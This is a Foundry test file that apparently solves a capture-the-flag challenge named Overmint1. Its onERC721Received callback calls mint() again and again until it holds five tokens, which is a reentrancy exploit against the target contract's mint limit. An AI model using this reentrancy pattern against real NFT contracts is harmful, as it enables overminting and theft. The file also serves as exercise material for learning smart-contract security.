// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "../../../../src/Week2/CTF/Overmint1.sol";

contract Overmint1Test is Test, IERC721Receiver {
    Overmint1 public overmint1;

    function setUp() public {
        overmint1 = new Overmint1();
    }

    function attack() public {
        overmint1.mint();
    }

    function test1Attack() public {
        attack();
        assertEq(overmint1.success(address(this)), true);
    }

    function onERC721Received(
        address from,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (overmint1.balanceOf(from) < 5) attack();
        return IERC721Receiver.onERC721Received.selector;
    }
}
